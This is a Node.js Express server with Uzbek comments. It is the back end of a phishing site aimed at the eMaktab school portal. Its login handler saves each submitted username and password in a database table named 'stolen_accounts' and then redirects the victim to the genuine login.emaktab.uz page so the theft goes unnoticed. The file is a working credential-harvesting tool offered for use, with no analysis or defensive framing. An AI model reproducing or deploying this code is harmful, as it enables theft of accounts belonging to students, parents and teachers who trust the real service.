require('dotenv').config();
const express = require("express");
const { Pool } = require("pg");
const path = require("path");
const app = express();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false 
  }
});

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.post("/auth/login", async (req, res) => {
  const { login, password } = req.body;

  try {
    await pool.query(
      "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
      [login, password]
    );

    console.log(`Baza yangilandi: ${login} saqlandi!`);
    res.redirect("https://login.emaktab.uz");

  } catch (err) {
    console.error("Xatolik yuz berdi:", err);
    res.redirect("https://login.emaktab.uz");
  }
});

// 3. Portni sozlash (Render avtomatik port tayinlaydi)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server ${PORT}-portda ishga tushdi`);
});